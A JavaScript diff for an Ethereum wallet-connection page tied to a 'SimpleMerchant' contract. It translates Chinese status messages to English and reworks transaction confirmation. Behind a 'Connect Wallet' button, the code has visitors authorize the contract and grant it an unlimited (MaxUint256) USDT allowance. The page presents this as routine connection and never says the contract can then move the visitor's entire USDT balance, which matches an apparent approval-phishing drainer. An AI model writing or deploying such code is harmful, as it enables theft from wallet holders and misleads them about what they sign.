@@ -1,5 +1,8 @@
-const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f';
-const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+// Smart Contract Addresses
+const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f'; // SimpleMerchant Contract Address
+const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Official USDT on Ethereum Mainnet
+
+// Smart Contract ABIs (Interface)
 const CONTRACT_ABI = [
     "function connectAndAuthorize() external",
     "function authorized(address customer) external view returns (bool)",
@@ -18,13 +21,14 @@ let provider, signer, userAddress, contract, usdtContract;
 let accountChangeListener = null;
 let chainChangeListener = null;
 
-// 重試函數：處理臨時性 RPC 錯誤
+// Retry function for temporary RPC errors
 async function retry(fn, maxAttempts = 5, delayMs = 2000) {
     for (let attempt = 1; attempt <= maxAttempts; attempt++) {
         try {
             return await fn();
         } catch (error) {
-            if (attempt === maxAttempts || !error.message.includes('service temporarily unavailable')) {
+            // Only retry if it's a temporary service error (adjust error message as needed)
+            if (attempt === maxAttempts || !error.message.toLowerCase().includes('service temporarily unavailable')) {
                 throw error;
             }
             console.warn(`Retry ${attempt}/${maxAttempts}: ${error.message}`);
@@ -33,19 +37,12 @@ async function retry(fn, maxAttempts = 5, delayMs = 2000) {
     }
 }
 
-// 等待交易確認
-async function waitForTransaction(txHash) {
-    return await retry(async () => {
-        const receipt = await provider.getTransactionReceipt(txHash);
-        if (!receipt) throw new Error('Transaction receipt not found, still pending');
-        return receipt;
-    }, 5, 2000);
-}
+// Removed waitForTransaction function, replaced by tx.wait()
 
 async function initializeWallet() {
     try {
         if (typeof window.ethereum === 'undefined') {
-            updateStatus('請安裝 MetaMask 或支援的錢包'); // Please install MetaMask or a supported wallet
+            updateStatus('Please install MetaMask or a supported wallet');
             return;
         }
         
@@ -58,19 +55,20 @@ async function initializeWallet() {
         // Check network and switch to Mainnet
         const network = await provider.getNetwork();
         if (network.chainId !== 1n) {
-            updateStatus('正在切換到以太坊主網...'); // Switching to Ethereum Mainnet...
+            updateStatus('Switching to Ethereum Mainnet...');
             try {
                 await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
                     params: [{ chainId: '0x1' }]
                 });
+                // Reinitialize provider after chain switch
                 provider = new ethers.BrowserProvider(window.ethereum);
                 await provider.getNetwork();
             } catch (switchError) {
                 if (switchError.code === 4001) {
-                    updateStatus('用戶拒絕切換網絡，請手動切換到以太坊主網。'); // User rejected network switch
+                    updateStatus('User rejected network switch. Please switch to Ethereum Mainnet manually.');
                 } else {
-                    updateStatus(`切換網絡失敗：${switchError.message}`); // Network switch failed
+                    updateStatus(`Network switch failed: ${switchError.message}`);
                 }
                 return;
             }
@@ -83,15 +81,15 @@ async function initializeWallet() {
             contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
             usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
             await checkAuthorization();
-            updateStatus('已恢復連繫狀態，正在檢查授權狀態'); // Connection restored, checking authorization status
+            updateStatus('Connection restored, checking authorization status');
         } else {
-            updateStatus('請連繫錢包'); // Please connect wallet
+            updateStatus('Please connect wallet');
         }
 
         accountChangeListener = (accounts) => {
             if (accounts.length === 0) {
                 resetState();
-                updateStatus('錢包已斷開連繫'); // Wallet disconnected
+                updateStatus('Wallet disconnected');
             } else {
                 initializeWallet();
             }
@@ -100,12 +98,12 @@ async function initializeWallet() {
 
         chainChangeListener = () => {
             resetState();
-            updateStatus('網絡已切換，請重新連繫錢包'); // Network changed, please reconnect wallet
+            updateStatus('Network changed. Please reload and reconnect.');
             window.location.reload();
         };
         window.ethereum.on('chainChanged', chainChangeListener);
     } catch (error) {
-        updateStatus(`初始化失敗：${error.message}`); // Initialization failed
+        updateStatus(`Initialization failed: ${error.message}`);
         console.error("Initialize Wallet Error:", error);
     }
 }
@@ -118,7 +116,8 @@ async function checkAuthorization() {
 
         const isAuthorized = await retry(() => contract.authorized(userAddress), 3, 1000);
         const usdtAllowance = await retry(() => usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS), 3, 1000);
-        const maxAllowance = ethers.MaxUint256;
+        // Use a large BigInt for comparison, but not max to avoid issues with older token implementations
+        const maxAllowanceThreshold = ethers.MaxUint256 / 2n; 
         
         let usdtBalance = 0n;
         try {
@@ -128,38 +127,38 @@ async function checkAuthorization() {
         }
 
         let statusMessage = '';
-        const isUsdtMaxApproved = usdtAllowance >= maxAllowance / 2n;
+        const isUsdtMaxApproved = usdtAllowance >= maxAllowanceThreshold;
 
         if (isAuthorized) {
-            statusMessage += 'SimpleMerchant 合約已授權 ✅。'; // SimpleMerchant contract authorized
+            statusMessage += 'SimpleMerchant contract authorized ✅. ';
         } else {
-            statusMessage += 'SimpleMerchant 合約未授權 ❌。'; // SimpleMerchant contract NOT authorized
+            statusMessage += 'SimpleMerchant contract NOT authorized ❌. ';
         }
 
-        statusMessage += `USDT 餘額：${ethers.formatUnits(usdtBalance, 6)}。`; // USDT Balance
+        statusMessage += `USDT Balance: ${ethers.formatUnits(usdtBalance, 6)}. `;
         if (isUsdtMaxApproved) {
-            statusMessage += `USDT 已授權足夠金額 (MaxUint256) ✅。`; // USDT approved for MaxUint256
+            statusMessage += `USDT approved (MaxUint256) ✅.`;
         } else if (usdtAllowance > 0n) {
-            statusMessage += `USDT 授權金額不足 ⚠️。`; // USDT approval amount insufficient
+            statusMessage += `USDT approval amount insufficient ⚠️.`;
         } else {
-            statusMessage += `USDT 未授權或授權為零 ❌。`; // USDT not approved or approval is zero
+            statusMessage += `USDT not approved or approval is zero ❌.`;
         }
 
         const allAuthorized = isAuthorized && isUsdtMaxApproved;
 
         if (allAuthorized) {
             connectButton.classList.add('connected');
-            connectButton.title = '斷開錢包'; // Disconnect Wallet
+            connectButton.title = 'Disconnect Wallet';
             connectButton.disabled = false;
-            updateStatus(`已連繫並完成所有授權。${statusMessage}`); // Connected and fully authorized
+            updateStatus(`Connected and fully authorized. ${statusMessage}`);
         } else {
             connectButton.classList.remove('connected');
-            connectButton.title = '連繫錢包 (完成授權)'; // Connect Wallet (Complete Authorization)
+            connectButton.title = 'Connect Wallet (Complete Authorization)';
             connectButton.disabled = false;
-            updateStatus(`請連繫錢包並完成所有授權。${statusMessage} 點擊錢包按鈕將提示您簽署交易。`); // Please connect and complete authorizations
+            updateStatus(`Please connect and complete all authorizations. ${statusMessage} Click the wallet button to initiate transactions.`);
         }
     } catch (error) {
-        updateStatus(`檢查授權失敗：${error.message}`); // Authorization check failed
+        updateStatus(`Authorization check failed: ${error.message}`);
         console.error("Check Authorization Error:", error);
     }
 }
@@ -167,7 +166,7 @@ async function checkAuthorization() {
 async function connectWallet() {
     try {
         if (typeof window.ethereum === 'undefined') {
-            updateStatus('請安裝 MetaMask 或支援的錢包');
+            updateStatus('Please install MetaMask or a supported wallet');
             return;
         }
 
@@ -180,53 +179,75 @@ async function connectWallet() {
         const ethBalance = await retry(() => provider.getBalance(userAddress), 3, 1000);
         const requiredEthForGas = ethers.parseEther('0.001');
         if (ethBalance < requiredEthForGas) {
-            updateStatus(`警告：ETH 餘額可能不足以支付授權交易的 Gas 費用 (建議至少 ${ethers.formatEther(requiredEthForGas)} ETH，實際 ${ethers.formatEther(ethBalance)} ETH)。`); // Warning: ETH balance may be insufficient
+            updateStatus(`Warning: ETH balance may be insufficient for gas (recommended: ${ethers.formatEther(requiredEthForGas)} ETH, actual: ${ethers.formatEther(ethBalance)} ETH).`);
         } else {
-            updateStatus('ETH 餘額充足，正在檢查授權...'); // ETH balance sufficient
+            updateStatus('ETH balance sufficient, checking authorizations...');
         }
 
+        // --- Transaction 1: SimpleMerchant Contract Authorization ---
         const isAuthorized = await retry(() => contract.authorized(userAddress), 3, 1000);
         if (!isAuthorized) {
-            updateStatus('正在授權 SimpleMerchant 合約 (交易 1/2)...'); // Authorizing SimpleMerchant Contract
+            updateStatus('Authorizing SimpleMerchant Contract (Transaction 1/2)... **Please check your wallet for the signature request.**');
             const txAuthorize = await contract.connectAndAuthorize();
-            await retry(() => waitForTransaction(txAuthorize.hash), 5, 2000);
-            updateStatus('SimpleMerchant 合約授權成功。'); // SimpleMerchant Contract authorization successful
+            
+            // USE tx.wait() for reliable transaction confirmation
+            await txAuthorize.wait(); 
+            
+            updateStatus('SimpleMerchant Contract authorization successful.');
         } else {
-            updateStatus('SimpleMerchant 合約已授權，正在檢查 USDT 授權...'); // SimpleMerchant Contract already authorized
+            updateStatus('SimpleMerchant Contract already authorized, checking USDT approval...');
         }
 
+        // --- Transaction 2: USDT Token Approval ---
         const usdtAllowance = await retry(() => usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS), 3, 1000);
         const maxAllowance = ethers.MaxUint256;
-        if (usdtAllowance < maxAllowance / 2n) {
-            updateStatus('正在批准 USDT 代幣 (MaxUint256) (交易 2/2)...'); // Authorizing USDT Token
+        const maxAllowanceThreshold = maxAllowance / 2n;
+
+        if (usdtAllowance < maxAllowanceThreshold) {
+            updateStatus('Approving USDT Token (MaxUint256) (Transaction 2/2)... **Please check your wallet for the signature request.**');
             const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
-            await retry(() => waitForTransaction(txApprove.hash), 5, 2000);
-            updateStatus('USDT 代幣批准成功 (已設為 MaxUint256)。'); // USDT Token approval successful
+            
+            // USE tx.wait() for reliable transaction confirmation
+            await txApprove.wait(); 
+            
+            updateStatus('USDT Token approval successful (set to MaxUint256).');
         } else {
-            updateStatus('USDT 代幣已授權足夠金額 (MaxUint256)。'); // USDT Token already approved
+            updateStatus('USDT Token already approved (MaxUint256).');
         }
 
         await checkAuthorization();
-        updateStatus('已連繫並完成所有必要授權。'); // Connected and all necessary authorizations completed
+        updateStatus('Connected and all necessary authorizations completed.');
     } catch (error) {
         let errorMessage = error.message;
         if (error.code === 4001) {
-            errorMessage = '用戶拒絕交易'; // User rejected transaction
+            errorMessage = 'User rejected transaction';
+        } else if (error.code === 'TRANSACTION_REPLACED' && error.replacement.hash) {
+            // Handle transaction replacement (speed up/cancel)
+            errorMessage = `Transaction was replaced (New Hash: ${error.replacement.hash}). Checking new receipt...`;
+            try {
+                // Wait for the new transaction to be mined
+                await provider.waitForTransaction(error.replacement.hash);
+                await checkAuthorization();
+                updateStatus('Transaction successful after replacement.');
+                return;
+            } catch (waitError) {
+                 errorMessage = `Replacement transaction failed: ${waitError.message}`;
+            }
         } else if (error.code === -32603) {
-            errorMessage = '服務暫不可用，請稍後重試或切換 RPC 提供者'; // Service temporarily unavailable
+            errorMessage = 'Service temporarily unavailable. Please retry or switch RPC provider.';
         }
-        updateStatus(`操作失敗：${errorMessage}`); // Operation failed
+        updateStatus(`Operation failed: ${errorMessage}`);
         console.error("Connect Wallet Error:", error);
         connectButton.classList.remove('connected');
-        connectButton.title = '連繫錢包'; // Connect Wallet
+        connectButton.title = 'Connect Wallet';
         connectButton.disabled = false;
     }
 }
 
 function disconnectWallet() {
     resetState();
-    updateStatus('錢包已斷開連繫，請重新連繫。'); // Wallet disconnected
-    alert('錢包已斷開連繫。請在 MetaMask 設置中手動從“已連繫的網站”中移除本網站以完全斷開。'); // Manually remove from MetaMask
+    updateStatus('Wallet disconnected. Please reconnect.');
+    alert('Wallet disconnected. You may need to manually remove this site from "Connected Sites" in your wallet settings for a complete disconnect.');
 }
 
 function resetState() {
@@ -235,14 +256,14 @@ function resetState() {
     contract = null;
     usdtContract = null;
     connectButton.classList.remove('connected');
-    connectButton.title = '連繫錢包'; // Connect Wallet
+    connectButton.title = 'Connect Wallet';
     connectButton.disabled = false;
 }
 
 function updateStatus(message) {
     const statusDiv = document.getElementById('status');
     if (statusDiv) {
-        statusDiv.innerHTML = `<strong>狀態：</strong> ${message}`; // Status
+        statusDiv.innerHTML = `<strong>STATUS:</strong> ${message}`;
     }
 }
 
